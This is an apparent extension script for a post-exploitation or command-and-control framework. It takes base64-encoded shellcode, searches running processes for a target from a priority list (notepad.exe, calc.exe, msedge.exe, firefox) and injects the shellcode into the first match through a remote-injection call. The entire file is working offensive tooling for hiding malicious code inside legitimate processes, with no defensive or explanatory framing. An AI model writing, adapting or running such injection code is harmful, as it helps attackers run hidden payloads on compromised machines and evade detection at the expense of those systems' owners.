// Usage: extension load inject_hunter <b64_shellcode>

let payload = args[0];
print_log("Hunting for injection targets...");

let procs = internal_procs();
let lines = procs.split('\n');
let target_pid = "";

// Priority List
let targets = ["notepad.exe", "calc.exe", "msedge.exe", "firefox"];

for line in lines {
    let parts = line.split('|');
    if parts.len() == 2 {
        let pid = parts[0];
        let name = parts[1].to_lower();
        
        for t in targets {
            if name.contains(t) {
                print_log("Found target: " + name + " (" + pid + ")");
                target_pid = pid;
                break;
            }
        }
    }
    if target_pid != "" { break; }
}

if target_pid == "" {
    return "No suitable target process found.";
}

print_log("Injecting into " + target_pid + "...");
return native_inject_remote(target_pid, payload);
